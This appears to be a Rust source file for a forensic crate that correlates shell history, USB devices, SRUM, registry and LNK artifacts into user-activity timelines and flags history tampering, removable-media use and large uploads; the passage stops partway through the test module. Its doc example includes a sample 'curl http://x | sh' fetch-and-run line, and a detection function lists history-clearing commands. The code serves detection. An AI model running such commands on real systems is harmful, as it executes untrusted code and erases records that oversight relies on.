//! `useract-forensic` — the user-activity correlation layer.
//!
//! A thin **meta / orchestration** crate: it does not parse any raw format
//! itself. It consumes already-decoded forensic reader types —
//! [`shellhist_core::HistoryEntry`], [`peripheral_core::DeviceConnection`], SRUM
//! records ([`srum_core`]), registry artifacts ([`winreg_artifacts`]), and Shell
//! Link targets ([`lnk_core::ShellLink`]) — normalizes them into one uniform
//! [`UserActivity`] event, builds a per-user timeline, and emits cross-source
//! [`forensicnomicon::report::Finding`]s that no single source could produce alone.
//!
//! Every finding is an **observation** ("consistent with …"); the examiner draws
//! the conclusions. MITRE techniques are narrated as consistency, never a verdict.
//!
//! ## 30-second example
//!
//! ```
//! use useract_forensic::{build_timeline, audit, ShellHistorySource, DeviceSource};
//! use shellhist_core::{HistoryEntry, Shell};
//!
//! // (sources are normally produced by the reader crates; constructed here inline)
//! let entries = shellhist_core::parse_auto(b"#1700000000\ncurl http://x | sh\n", Some(".bash_history"));
//! let shell = ShellHistorySource::new(&entries);
//! let devices = DeviceSource::new(&[]);
//!
//! let timeline = build_timeline(&[&shell, &devices]);
//! let findings = audit(&timeline);
//! for f in &findings {
//!     println!("{} — {}", f.code, f.note);
//! }
//! ```
//!
//! ## Sources
//!
//! Every source slots in behind the [`ActivitySource`] trait: shell history and
//! peripheral devices (v0.1) plus SRUM (per-user app/network usage by SID — the
//! first actor-attributing source), registry artifacts (UserAssist / TypedURLs /
//! ShellBags), and recent-file LNK targets (carrying the volume serial that
//! completes the device join). See `docs/roadmap.md` for the v0.3 sources.

#![forbid(unsafe_code)]

use forensicnomicon::report::{Category, ExternalRef, Finding, Severity, Source};
use peripheral_core::{Bus, DeviceConnection};
use shellhist_core::HistoryEntry;

/// What a user did to a [`Subject`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Action {
    /// Ran a program or command.
    Executed,
    /// Opened or read a file/folder.
    Accessed,
    /// Attached / connected a device.
    Connected,
    /// Issued a search query.
    Searched,
    /// Typed text (e.g. a typed URL / run-box entry).
    Typed,
    /// Disabled, cleared, or otherwise tampered with an activity record.
    HistoryTampered,
}

/// The thing an [`Action`] was performed on.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum Subject {
    /// A shell command or program invocation.
    Command(String),
    /// A file path, carrying the **volume serial** of the volume it lives on when
    /// the source knows it (LNK `VolumeID`). The serial is the join key to a
    /// [`Subject::Device`] with the same volume serial (see
    /// [`device_file_volume_joins`]).
    File {
        /// The file path.
        path: String,
        /// NTFS/FAT volume serial of the file's volume, when known.
        volume_serial: Option<u32>,
    },
    /// A folder path, carrying the **volume serial** of the volume it lives on when
    /// the source knows it (shellbag / LNK directory target).
    Folder {
        /// The folder path.
        path: String,
        /// NTFS/FAT volume serial of the folder's volume, when known.
        volume_serial: Option<u32>,
    },
    /// An external device, with its volume serial kept distinct so an LNK /
    /// shellbag [`Subject::File`] carrying the same NTFS/FAT volume serial can be
    /// joined to it (see [`device_file_volume_joins`]).
    Device {
        /// Device instance id (the stable primary key).
        id: String,
        /// NTFS/FAT volume serial of the device's volume, when known.
        volume_serial: Option<u32>,
    },
    /// A search / lookup query.
    Query(String),
}

impl Subject {
    /// A file path with no known volume serial.
    #[must_use]
    pub fn file(path: impl Into<String>) -> Self {
        Self::File {
            path: path.into(),
            volume_serial: None,
        }
    }

    /// A folder path with no known volume serial.
    #[must_use]
    pub fn folder(path: impl Into<String>) -> Self {
        Self::Folder {
            path: path.into(),
            volume_serial: None,
        }
    }
}

/// Which reader the activity was normalized from.
///
/// Extensible: marked `#[non_exhaustive]` so adding a variant is non-breaking;
/// consumers must use a `_` arm when matching.
#[non_exhaustive]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SourceKind {
    /// `shellhist-core` — shell command history.
    ShellHistory,
    /// `peripheral-core` — external-device connections.
    PeripheralDevice,
    /// `srum-core` / `srum-parser` — per-user app execution and network bytes,
    /// attributed to a user SID (the first by-SID source).
    Srum,
    /// `winreg-artifacts` — registry per-user artifacts (UserAssist, TypedURLs,
    /// ShellBags).
    Registry,
    /// `lnk-core` — Windows Shell Link (`.lnk`) targets, carrying the volume
    /// serial that completes the device join.
    LnkFile,
}

/// One normalized user-activity event: *who* did *what*, *when*, to *which* subject.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UserActivity {
    /// Unix epoch seconds, when the source records it. `None` when the source
    /// carries no usable timestamp (e.g. plain bash / PowerShell PSReadLine).
    pub timestamp: Option<i64>,
    /// The acting user / SID, when the source attributes it. Most v0.1 sources do
    /// not attribute a user; SRUM (v0.2) is the first by-SID source.
    pub actor: Option<String>,
    /// What was done.
    pub action: Action,
    /// What it was done to.
    pub subject: Subject,
    /// Which reader produced this event.
    pub source: SourceKind,
    /// A human-readable detail string for the event.
    pub detail: String,
}

/// A producer of [`UserActivity`] events.
///
/// Implementing this trait is the v0.2 extension seam: a new reader wrapper
/// (`lnk-core`, `shellbag-core`, `srum-core`, `winreg-artifacts`) implements
/// `activities` and slots into [`build_timeline`] with no API change.
pub trait ActivitySource {
    /// The activities this source contributes to the timeline.
    fn activities(&self) -> Vec<UserActivity>;
}

/// Does this shell command disable or clear command history?
///
/// Recognizes the common anti-forensic primitives across bash/zsh/PowerShell. The
/// match is on structure (the verb + the well-known history target), not on a
/// hardcoded full command line, so any member of the class is caught.
fn is_history_tamper(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    let c = c.trim();
    // bash/zsh: unset the history file, point it at the bit bucket, or clear it.
    c.contains("unset histfile")
        || c.contains("histfile=/dev/null")
        || c.contains("histsize=0")
        || c.contains("histfilesize=0")
        || (c.contains("history") && (c.contains(" -c") || c.ends_with("-c")))
        || c.contains("history -c")
        // PowerShell PSReadLine history file removal.
        || (c.contains("clear-history"))
        || (c.contains("remove-item") && c.contains("consolehost_history"))
        // Truncate/remove the history file directly.
        || (c.contains("rm ") && c.contains(".bash_history"))
        || (c.contains("rm ") && c.contains(".zsh_history"))
        || (c.starts_with("> ") && c.contains("history"))
}

/// A [`ShellHistorySource`] wraps a borrowed slice of decoded history entries.
///
/// Each command becomes an [`Action::Executed`] [`UserActivity`]; a command that
/// disables or clears history becomes an [`Action::HistoryTampered`] event instead
/// (the clearing itself is the activity worth surfacing).
pub struct ShellHistorySource<'a> {
    entries: &'a [HistoryEntry],
    actor: Option<String>,
}

impl<'a> ShellHistorySource<'a> {
    /// Wrap decoded history entries with no attributed actor.
    #[must_use]
    pub fn new(entries: &'a [HistoryEntry]) -> Self {
        Self {
            entries,
            actor: None,
        }
    }

    /// Wrap decoded history entries, attributing them to a known user/account.
    #[must_use]
    pub fn for_actor(entries: &'a [HistoryEntry], actor: impl Into<String>) -> Self {
        Self {
            entries,
            actor: Some(actor.into()),
        }
    }
}

impl ActivitySource for ShellHistorySource<'_> {
    fn activities(&self) -> Vec<UserActivity> {
        from_shell_history(self.entries, self.actor.as_deref())
    }
}

/// Normalize a decoded shell-history stream into [`UserActivity`] events.
///
/// Each command → [`Action::Executed`]; a history-clearing command →
/// [`Action::HistoryTampered`]. The `actor` (when known) is carried onto every
/// event.
#[must_use]
pub fn from_shell_history(entries: &[HistoryEntry], actor: Option<&str>) -> Vec<UserActivity> {
    entries
        .iter()
        .map(|e| {
            let action = if is_history_tamper(&e.command) {
                Action::HistoryTampered
            } else {
                Action::Executed
            };
            UserActivity {
                timestamp: e.timestamp,
                actor: actor.map(ToString::to_string),
                action,
                subject: Subject::Command(e.command.clone()),
                source: SourceKind::ShellHistory,
                detail: e.command.clone(),
            }
        })
        .collect()
}

/// A [`DeviceSource`] wraps a borrowed slice of decoded device connections.
///
/// Each connection becomes an [`Action::Connected`] [`UserActivity`] whose
/// [`Subject::Device`] carries the device instance id and the **volume serial**, so
/// the v0.2 LNK/shellbag join can light up.
pub struct DeviceSource<'a> {
    connections: &'a [DeviceConnection],
}

impl<'a> DeviceSource<'a> {
    /// Wrap decoded device connections.
    #[must_use]
    pub fn new(connections: &'a [DeviceConnection]) -> Self {
        Self { connections }
    }
}

impl ActivitySource for DeviceSource<'_> {
    fn activities(&self) -> Vec<UserActivity> {
        from_device_connections(self.connections)
    }
}

/// Normalize a decoded device-connection stream into [`UserActivity`] events.
///
/// Each connection → [`Action::Connected`], carrying the device id and the volume
/// serial. The timestamp is the device's first-install/first-seen stamp when the
/// source recorded one.
#[must_use]
pub fn from_device_connections(connections: &[DeviceConnection]) -> Vec<UserActivity> {
    connections
        .iter()
        .map(|c| {
            let timestamp = c
                .first_install
                .or(c.last_arrival)
                .or(c.last_install)
                .map(|s| s.value);
            UserActivity {
                timestamp,
                actor: None,
                action: Action::Connected,
                subject: Subject::Device {
                    id: c.device_instance_id.clone(),
                    volume_serial: c.volume_serial,
                },
                source: SourceKind::PeripheralDevice,
                detail: c.device_instance_id.clone(),
            }
        })
        .collect()
}

/// A [`SrumSource`] wraps borrowed SRUM network-usage and app-usage records plus
/// the `SruDbIdMapTable` that resolves their integer `user_id` / `app_id` foreign
/// keys to user SIDs and application paths.
///
/// SRUM is the first source that **attributes** activity to a specific user: each
/// row becomes an [`Action::Executed`] [`UserActivity`] whose `actor` is the
/// resolved user SID. Network rows additionally carry the per-interval byte volume
/// in `detail`, sharpening the exfiltration lens.
pub struct SrumSource<'a> {
    network: &'a [srum_core::NetworkUsageRecord],
    app_usage: &'a [srum_core::AppUsageRecord],
    id_map: &'a [srum_core::IdMapEntry],
}

impl<'a> SrumSource<'a> {
    /// Wrap decoded SRUM records with the id-map needed to resolve users and apps.
    #[must_use]
    pub fn new(
        network: &'a [srum_core::NetworkUsageRecord],
        app_usage: &'a [srum_core::AppUsageRecord],
        id_map: &'a [srum_core::IdMapEntry],
    ) -> Self {
        Self {
            network,
            app_usage,
            id_map,
        }
    }
}

impl ActivitySource for SrumSource<'_> {
    fn activities(&self) -> Vec<UserActivity> {
        from_srum(self.network, self.app_usage, self.id_map)
    }
}

/// Resolve a SRUM integer id to its mapped name via the `SruDbIdMapTable`.
///
/// Returns `None` when the id is absent from the map — the caller substitutes a
/// stable synthetic token so the foreign key is never silently dropped.
fn resolve_id(id: i32, id_map: &[srum_core::IdMapEntry]) -> Option<String> {
    id_map
        .iter()
        .find(|e| e.id == id)
        .map(|e| e.name.clone())
        .filter(|n| !n.is_empty())
}

/// Normalize SRUM network-usage and app-usage records into [`UserActivity`] events.
///
/// Each record → [`Action::Executed`], attributed to the user SID resolved from the
/// id-map (falling back to a `user-id:<n>` token when unresolved). The application
/// resolves to its path (falling back to `app-id:<n>`). Network rows carry their
/// `<bytes_sent>↑ / <bytes_recv>↓ bytes` in `detail`; app-usage rows carry their
/// foreground/background CPU cycles. The `DateTime<Utc>` timestamp becomes Unix
/// epoch seconds.
#[must_use]
pub fn from_srum(
    network: &[srum_core::NetworkUsageRecord],
    app_usage: &[srum_core::AppUsageRecord],
    id_map: &[srum_core::IdMapEntry],
) -> Vec<UserActivity> {
    let mut acts = Vec::with_capacity(network.len() + app_usage.len());

    for r in network {
        let actor =
            resolve_id(r.user_id, id_map).unwrap_or_else(|| format!("user-id:{}", r.user_id));
        let app = resolve_id(r.app_id, id_map).unwrap_or_else(|| format!("app-id:{}", r.app_id));
        acts.push(UserActivity {
            timestamp: Some(r.timestamp.timestamp()),
            actor: Some(actor),
            action: Action::Executed,
            subject: Subject::Command(app),
            source: SourceKind::Srum,
            detail: format!(
                "{}\u{2191} / {}\u{2193} bytes (SRUM network usage)",
                r.bytes_sent, r.bytes_recv
            ),
        });
    }

    for r in app_usage {
        let actor =
            resolve_id(r.user_id, id_map).unwrap_or_else(|| format!("user-id:{}", r.user_id));
        let app = resolve_id(r.app_id, id_map).unwrap_or_else(|| format!("app-id:{}", r.app_id));
        acts.push(UserActivity {
            timestamp: Some(r.timestamp.timestamp()),
            actor: Some(actor),
            action: Action::Executed,
            subject: Subject::Command(app),
            source: SourceKind::Srum,
            detail: format!(
                "{} foreground / {} background CPU cycles (SRUM app usage)",
                r.foreground_cycles, r.background_cycles
            ),
        });
    }

    acts
}

/// A [`LnkSource`] wraps borrowed Windows Shell Link targets parsed by `lnk-core`.
///
/// Each [`ShellLink`](lnk_core::ShellLink) → an [`Action::Accessed`]
/// [`Subject::File`] whose path is the link's local base path (or the network
/// target's UNC name) and whose `volume_serial` is the `VolumeID`
/// `DriveSerialNumber` — the structured key that completes the device join. The
/// target's last-write FILETIME becomes the activity timestamp.
pub struct LnkSource<'a> {
    links: &'a [lnk_core::ShellLink],
    actor: Option<String>,
}

impl<'a> LnkSource<'a> {
    /// Wrap parsed shell links, attributing them to a user when known.
    #[must_use]
    pub fn new(links: &'a [lnk_core::ShellLink], actor: Option<&str>) -> Self {
        Self {
            links,
            actor: actor.map(ToString::to_string),
        }
    }
}

impl ActivitySource for LnkSource<'_> {
    fn activities(&self) -> Vec<UserActivity> {
        from_lnk(self.links, self.actor.as_deref())
    }
}

/// Normalize parsed Shell Links into [`Action::Accessed`] file [`UserActivity`]s.
///
/// Each link's target path comes from `link_info.local_base_path`; when that is
/// absent, the `CommonNetworkRelativeLink` net name (a UNC share) is used. A link
/// with no `LinkInfo` and no resolvable target is skipped rather than emitting a
/// pathless event. The target's `write_time` FILETIME (already Unix epoch seconds,
/// 0 = unset) becomes the timestamp; the `VolumeID` drive serial is carried on the
/// [`Subject::File`] as the device-join key.
#[must_use]
pub fn from_lnk(links: &[lnk_core::ShellLink], actor: Option<&str>) -> Vec<UserActivity> {
    links
        .iter()
        .filter_map(|link| {
            let info = link.link_info.as_ref()?;
            let path = info.local_base_path.clone().or_else(|| {
                info.common_network_relative_link
                    .as_ref()
                    .and_then(|c| c.net_name.clone())
            })?;
            let volume_serial = info.volume_id.as_ref().map(|v| v.drive_serial_number);
            // lnk-core already maps a zero "not set" FILETIME to 0 epoch seconds.
            let timestamp = (link.header.write_time != 0).then_some(link.header.write_time);
            Some(UserActivity {
                timestamp,
                actor: actor.map(ToString::to_string),
                action: Action::Accessed,
                subject: Subject::File {
                    path: path.clone(),
                    volume_serial,
                },
                source: SourceKind::LnkFile,
                detail: format!("LNK target: {path}"),
            })
        })
        .collect()
}

/// Parse an ISO-8601 `%Y-%m-%dT%H:%M:%SZ` UTC timestamp (the form
/// `winreg-artifacts` emits) into Unix epoch seconds. Returns [`None`] for an
/// absent or unparseable value — a missing timestamp is forensically meaningful,
/// not an error.
fn iso8601_to_epoch(s: Option<&str>) -> Option<i64> {
    let s = s?;
    chrono::DateTime::parse_from_rfc3339(s)
        .ok()
        .map(|dt| dt.timestamp())
}

/// A [`RegistrySource`] wraps borrowed per-user registry artifacts decoded by
/// `winreg-artifacts` from an `NTUSER.DAT` / `USRCLASS.DAT` hive.
///
/// It normalizes the three published per-user artifacts:
/// [`UserAssist`](winreg_artifacts::userassist) → [`Action::Executed`],
/// [`TypedURLs`](winreg_artifacts::typed_urls) → [`Action::Typed`], and
/// [`ShellBags`](winreg_artifacts::shellbags) → [`Action::Accessed`] (folder).
///
/// `winreg-artifacts` v0.1 publishes exactly these three per-user decoders; it has
/// no separate RecentDocs / RunMRU / MountPoints2 / TypedPaths modules, so the
/// adapter maps the artifacts that actually exist.
pub struct RegistrySource<'a> {
    userassist: &'a [winreg_artifacts::userassist::UserAssistEntry],
    typed_urls: &'a [winreg_artifacts::typed_urls::TypedUrl],
    shellbags: &'a [winreg_artifacts::shellbags::ShellbagEntry],
    actor: Option<String>,
}

impl<'a> RegistrySource<'a> {
    /// Wrap decoded registry artifacts, attributing them to a user when known (the
    /// hive owner — the SID/account the `NTUSER.DAT` belongs to).
    #[must_use]
    pub fn new(
        userassist: &'a [winreg_artifacts::userassist::UserAssistEntry],
        typed_urls: &'a [winreg_artifacts::typed_urls::TypedUrl],
        shellbags: &'a [winreg_artifacts::shellbags::ShellbagEntry],
        actor: Option<&str>,
    ) -> Self {
        Self {
            userassist,
            typed_urls,
            shellbags,
            actor: actor.map(ToString::to_string),
        }
    }
}

impl ActivitySource for RegistrySource<'_> {
    fn activities(&self) -> Vec<UserActivity> {
        from_registry(
            self.userassist,
            self.typed_urls,
            self.shellbags,
            self.actor.as_deref(),
        )
    }
}

/// Normalize UserAssist entries into [`Action::Executed`] [`UserActivity`] events.
///
/// Each entry → an `Executed` activity whose subject is the program path; the run
/// count is carried in `detail` and the ROT13-decoded last-run timestamp parsed to
/// epoch. The `actor` (the hive owner) is carried when known.
#[must_use]
pub fn from_userassist(
    entries: &[winreg_artifacts::userassist::UserAssistEntry],
    actor: Option<&str>,
) -> Vec<UserActivity> {
    entries
        .iter()
        .map(|e| UserActivity {
            timestamp: iso8601_to_epoch(e.last_run.as_deref()),
            actor: actor.map(ToString::to_string),
            action: Action::Executed,
            subject: Subject::Command(e.program.clone()),
            source: SourceKind::Registry,
            detail: format!("UserAssist: {} run {} time(s)", e.program, e.run_count),
        })
        .collect()
}

/// Normalize IE/Edge TypedURLs into [`Action::Typed`] [`UserActivity`] events.
///
/// Each typed URL → a `Typed` activity carrying the URL as a [`Subject::Query`]
/// (an address-bar entry is a typed lookup); the companion `TypedURLsTime`
/// timestamp parsed to epoch.
#[must_use]
pub fn from_typed_urls(
    urls: &[winreg_artifacts::typed_urls::TypedUrl],
    actor: Option<&str>,
) -> Vec<UserActivity> {
    urls.iter()
        .map(|u| {
            let detail = match &u.suspicious_reason {
                Some(reason) => format!("TypedURL: {} ({reason})", u.url),
                None => format!("TypedURL: {}", u.url),
            };
            UserActivity {
                timestamp: iso8601_to_epoch(u.last_visited.as_deref()),
                actor: actor.map(ToString::to_string),
                action: Action::Typed,
                subject: Subject::Query(u.url.clone()),
                source: SourceKind::Registry,
                detail,
            }
        })
        .collect()
}

/// Normalize ShellBags into [`Action::Accessed`] folder [`UserActivity`] events.
///
/// Each BagMRU entry → an `Accessed` activity whose [`Subject::Folder`] is the
/// reconstructed folder path; the key's `LastWriteTime` parsed to epoch.
#[must_use]
pub fn from_shellbags(
    bags: &[winreg_artifacts::shellbags::ShellbagEntry],
    actor: Option<&str>,
) -> Vec<UserActivity> {
    bags.iter()
        .map(|b| UserActivity {
            timestamp: iso8601_to_epoch(b.last_written.as_deref()),
            actor: actor.map(ToString::to_string),
            action: Action::Accessed,
            subject: Subject::folder(b.path.clone()),
            source: SourceKind::Registry,
            detail: format!("ShellBag {}: {}", b.key_path, b.path),
        })
        .collect()
}

/// Normalize all three per-user registry artifacts into one [`UserActivity`] stream.
///
/// Concatenates [`from_userassist`], [`from_typed_urls`], and [`from_shellbags`],
/// attributing every event to the hive owner when known.
#[must_use]
pub fn from_registry(
    userassist: &[winreg_artifacts::userassist::UserAssistEntry],
    typed_urls: &[winreg_artifacts::typed_urls::TypedUrl],
    shellbags: &[winreg_artifacts::shellbags::ShellbagEntry],
    actor: Option<&str>,
) -> Vec<UserActivity> {
    let mut acts = from_userassist(userassist, actor);
    acts.extend(from_typed_urls(typed_urls, actor));
    acts.extend(from_shellbags(shellbags, actor));
    acts
}

/// Merge any number of [`ActivitySource`]s into one timeline, sorted by timestamp.
///
/// Events with a timestamp come first in ascending epoch order; `None`-timestamp
/// events are kept (their order is forensically meaningful too) and ordered stably
/// at the end, preserving source/insertion order among themselves.
#[must_use]
pub fn build_timeline(sources: &[&dyn ActivitySource]) -> Vec<UserActivity> {
    let mut events: Vec<UserActivity> = sources.iter().flat_map(|s| s.activities()).collect();
    // Stable sort keeps None-timestamp events in source order; the key puts
    // timestamped events first (ascending), untimestamped last.
    events.sort_by_key(|e| (e.timestamp.is_none(), e.timestamp.unwrap_or(i64::MAX)));
    events
}

/// The default temporal window (seconds) for the exec-during-removable-media join.
///
/// One hour: wide enough to catch a command run while a stick is mounted, tight
/// enough to keep the temporal coincidence meaningful and the false-positive rate
/// low.
pub const REMOVABLE_MEDIA_WINDOW_SECS: i64 = 3600;

/// The conservative per-interval `bytes_sent` threshold above which a SRUM network
/// row is surfaced as a graded exfiltration **lead** (`USERACT-NETWORK-EXFIL-VOLUME`).
///
/// SRUM aggregates per process per ~1-hour interval. 256 MiB sent by a single
/// process in one interval is well above routine background/telemetry traffic yet
/// low enough to catch a deliberate bulk upload; it is a deliberately conservative
/// lead, not a verdict — a backup client or large legitimate upload can also cross
/// it, so the examiner adjudicates.
pub const NETWORK_EXFIL_BYTES_THRESHOLD: u64 = 256 * 1024 * 1024;

/// The [`Source`] stamp for findings this analyzer emits.
#[must_use]
pub fn source(scope: impl Into<String>) -> Source {
    Source {
        analyzer: "useract-forensic".to_string(),
        scope: scope.into(),
        version: Some(env!("CARGO_PKG_VERSION").to_string()),
    }
}

/// Generic volume-serial join: pair every [`Subject::Device`] activity with every
/// [`Subject::File`] / [`Subject::Folder`] activity that names the **same volume
/// serial**.
///
/// Active in v0.2: a [`Subject::File`] / [`Subject::Folder`] carrying a
/// `volume_serial` (from `lnk-core`'s `VolumeID`) joins to a [`Subject::Device`]
/// connected with the same serial. Returns `(device_index, file_index)` pairs into
/// `events`.
///
/// The volume serial is read first from the subject's structured `volume_serial`
/// field; a `vol:<serial>` token in [`UserActivity::detail`] is honored as a
/// fallback so an out-of-band source that only annotates the detail still joins.
#[must_use]
pub fn device_file_volume_joins(events: &[UserActivity]) -> Vec<(usize, usize)> {
    let mut pairs = Vec::new();
    for (di, dev) in events.iter().enumerate() {
        let Subject::Device {
            volume_serial: Some(dev_serial),
            ..
        } = &dev.subject
        else {
            continue;
        };
        for (fi, file) in events.iter().enumerate() {
            if file_volume_serial(file) == Some(*dev_serial) {
                pairs.push((di, fi));
            }
        }
    }
    pairs
}

/// Extract a file/folder activity's volume serial: the subject's structured
/// `volume_serial` field, else a `vol:<serial>` token in its
/// [`UserActivity::detail`]. Non-file subjects yield [`None`].
fn file_volume_serial(activity: &UserActivity) -> Option<u32> {
    let structured = match &activity.subject {
        Subject::File { volume_serial, .. } | Subject::Folder { volume_serial, .. } => {
            *volume_serial
        }
        _ => return None,
    };
    if structured.is_some() {
        return structured;
    }
    for tok in activity.detail.split_whitespace() {
        if let Some(rest) = tok.strip_prefix("vol:") {
            if let Ok(serial) = rest.parse::<u32>() {
                return Some(serial);
            }
        }
    }
    None
}

/// Audit a merged timeline for cross-source user-activity findings.
///
/// Emits hedged, low-false-positive observations achievable from the v0.1 sources:
///
/// - `USERACT-EXEC-DURING-REMOVABLE-MEDIA` — a shell command executed within
///   [`REMOVABLE_MEDIA_WINDOW_SECS`] of a removable mass-storage device connection
///   (temporal cross-source join). Consistent with activity involving external
///   media (MITRE T1052 / T1091).
/// - `USERACT-HISTORY-TAMPERED` — a history-clearing activity present in the
///   timeline (re-surfaced at the user-activity layer; MITRE T1070.003).
///
/// Every finding is an observation, never a verdict.
#[must_use]
pub fn audit(events: &[UserActivity]) -> Vec<Finding> {
    audit_with(events, &source("host"))
}

/// [`audit`] with a caller-supplied [`Source`] stamp (scope/version).
#[must_use]
pub fn audit_with(events: &[UserActivity], src: &Source) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Removable mass-storage connection windows: (epoch, device id).
    //
    // Eligibility is derived structurally from the device instance id's leading
    // enumerator token (`USBSTOR`, `USB`, `SD`, `SCSI`, …) via the published
    // `peripheral_core::Bus` classifier — not a hardcoded device list — so any
    // mass-storage member of the class qualifies and HID/Bluetooth/MTP devices do
    // not.
    let media_windows: Vec<(i64, &str)> = events
        .iter()
        .filter_map(|e| match (&e.action, &e.subject, e.timestamp) {
            (Action::Connected, Subject::Device { id, .. }, Some(ts)) if is_mass_storage_id(id) => {
                Some((ts, id.as_str()))
            }
            _ => None,
        })
        .collect();

    // USERACT-FILE-ON-EXTERNAL-DEVICE — a file/folder accessed on a volume whose
    // serial matches a connected external device (the volume-serial join).
    for (di, fi) in device_file_volume_joins(events) {
        findings.push(file_on_external_device_finding(
            &events[di],
            &events[fi],
            src,
        ));
    }

    for event in events {
        // USERACT-HISTORY-TAMPERED — re-surface the clearing signal here.
        if event.action == Action::HistoryTampered {
            findings.push(history_tampered_finding(event, src));
            continue;
        }

        // USERACT-NETWORK-EXFIL-VOLUME — a SRUM network row whose per-interval
        // bytes_sent crosses the conservative threshold (graded lead, not a verdict).
        if event.source == SourceKind::Srum {
            if let Some(bytes_sent) = srum_network_bytes_sent(event) {
                if bytes_sent >= NETWORK_EXFIL_BYTES_THRESHOLD {
                    findings.push(network_exfil_volume_finding(event, bytes_sent, src));
                }
            }
        }

        // USERACT-EXEC-DURING-REMOVABLE-MEDIA — temporal cross-source join.
        if let (Action::Executed, Some(ts), Subject::Command(cmd)) =
            (event.action, event.timestamp, &event.subject)
        {
            if let Some((win_ts, dev_id)) = media_windows
                .iter()
                .find(|(dev_ts, _)| (ts - dev_ts).abs() <= REMOVABLE_MEDIA_WINDOW_SECS)
            {
                findings.push(exec_during_media_finding(cmd, ts, *win_ts, dev_id, src));
            }
        }
    }

    findings
}

/// Is this device instance id a removable mass-storage transport?
///
/// Classifies the leading enumerator token (the part before the first `\`) with the
/// published [`peripheral_core::Bus`] classifier. A bare id with no separator is
/// treated as its own enumerator. Structural, not a device allow-list.
fn is_mass_storage_id(instance_id: &str) -> bool {
    let enumerator = instance_id.split('\\').next().unwrap_or(instance_id);
    Bus::from_enumerator(enumerator).is_mass_storage()
}

fn history_tampered_finding(event: &UserActivity, src: &Source) -> Finding {
    let cmd = match &event.subject {
        Subject::Command(c) => c.as_str(),
        _ => event.detail.as_str(),
    };
    Finding::observation(
        Severity::Medium,
        Category::Concealment,
        "USERACT-HISTORY-TAMPERED",
    )
    .source(src.clone())
    .note(format!(
        "user activity {cmd:?} disables or clears the activity record; consistent with \
             anti-forensic history tampering (MITRE T1070.003)"
    ))
    .evidence("command", cmd.to_string())
    .external_ref(ExternalRef::mitre_attack("T1070.003"))
    .build()
}

fn exec_during_media_finding(
    cmd: &str,
    cmd_ts: i64,
    dev_ts: i64,
    dev_id: &str,
    src: &Source,
) -> Finding {
    Finding::observation(
        Severity::Low,
        Category::Threat,
        "USERACT-EXEC-DURING-REMOVABLE-MEDIA",
    )
    .source(src.clone())
    .note(format!(
        "the command {cmd:?} ran within {REMOVABLE_MEDIA_WINDOW_SECS}s of removable mass-storage \
         device {dev_id:?} being connected; consistent with activity involving external media \
         (MITRE T1052 / T1091)"
    ))
    .evidence("command", cmd.to_string())
    .evidence("device", dev_id.to_string())
    .evidence("command_epoch", cmd_ts.to_string())
    .evidence("device_epoch", dev_ts.to_string())
    .external_ref(ExternalRef::mitre_attack("T1052"))
    .external_ref(ExternalRef::mitre_attack("T1091"))
    .build()
}

/// Recover the `bytes_sent` value a SRUM network-usage activity advertises in its
/// `detail` (the `<n>\u{2191} …` prefix [`from_srum`] writes). Returns `None` for
/// any non-network SRUM activity (e.g. an app-usage row).
fn srum_network_bytes_sent(activity: &UserActivity) -> Option<u64> {
    let prefix = activity.detail.split('\u{2191}').next()?;
    prefix.trim().parse::<u64>().ok()
}

fn network_exfil_volume_finding(event: &UserActivity, bytes_sent: u64, src: &Source) -> Finding {
    let app = match &event.subject {
        Subject::Command(c) => c.as_str(),
        _ => event.detail.as_str(), // cov:unreachable: caller is a SRUM network row, always Subject::Command
    };
    let actor = event.actor.as_deref().unwrap_or("(unattributed)");
    Finding::observation(
        Severity::Medium,
        Category::Threat,
        "USERACT-NETWORK-EXFIL-VOLUME",
    )
    .source(src.clone())
    .note(format!(
        "SRUM records {bytes_sent} bytes sent in one interval by {app:?} attributed to user \
         {actor:?}; the volume exceeds the {NETWORK_EXFIL_BYTES_THRESHOLD}-byte lead threshold and \
         is consistent with bulk data exfiltration (MITRE T1048 / T1052) — a graded lead for the \
         examiner, not a verdict"
    ))
    .evidence("application", app.to_string())
    .evidence("actor", actor.to_string())
    .evidence("bytes_sent", bytes_sent.to_string())
    .external_ref(ExternalRef::mitre_attack("T1048"))
    .external_ref(ExternalRef::mitre_attack("T1052"))
    .build()
}

fn file_on_external_device_finding(
    device: &UserActivity,
    file: &UserActivity,
    src: &Source,
) -> Finding {
    let path = match &file.subject {
        Subject::File { path, .. } | Subject::Folder { path, .. } => path.as_str(),
        _ => file.detail.as_str(), // cov:unreachable: join only pairs File/Folder subjects here
    };
    let dev_id = match &device.subject {
        Subject::Device { id, .. } => id.as_str(),
        _ => device.detail.as_str(), // cov:unreachable: join only pairs Device subjects here
    };
    let serial = match &device.subject {
        Subject::Device {
            volume_serial: Some(s),
            ..
        } => *s,
        _ => 0, // cov:unreachable: join requires Device { volume_serial: Some(_) }
    };
    Finding::observation(
        Severity::Medium,
        Category::Threat,
        "USERACT-FILE-ON-EXTERNAL-DEVICE",
    )
    .source(src.clone())
    .note(format!(
        "a user accessed {path:?} on a volume (serial {serial:#010x}) whose serial matches the \
         connected external device {dev_id:?}; consistent with data movement to/from removable \
         media (MITRE T1052 / T1091)"
    ))
    .evidence("file", path.to_string())
    .evidence("device", dev_id.to_string())
    .evidence("volume_serial", format!("{serial:#010x}"))
    .external_ref(ExternalRef::mitre_attack("T1052"))
    .external_ref(ExternalRef::mitre_attack("T1091"))
    .build()
}

#[cfg(test)]
mod tests {
    use super::*;
    use peripheral_core::{Bus, Provenance, Stamp};
    use shellhist_core::{HistoryEntry, Shell};

    fn entry(cmd: &str, ts: Option<i64>) -> HistoryEntry {
        HistoryEntry {
            shell: Shell::Bash,
            command: cmd.to_string(),
            timestamp: ts,
            elapsed: None,
            paths: Vec::new(),
        }
    }

    fn device(
        instance_id: &str,
        bus: Bus,
        first_install: Option<i64>,
        vol: Option<u32>,
    ) -> DeviceConnection {
        DeviceConnection {
            bus,
            device_class_guid: None,
            vid: None,
            pid: None,
            device_serial: None,
            serial_is_os_generated: false,
            friendly_name: None,
            device_instance_id: instance_id.to_string(),
            first_install: first_install.map(Stamp::authoritative),
            last_install: None,
            last_arrival: None,
            last_removal: None,
            parent_id_prefix: None,
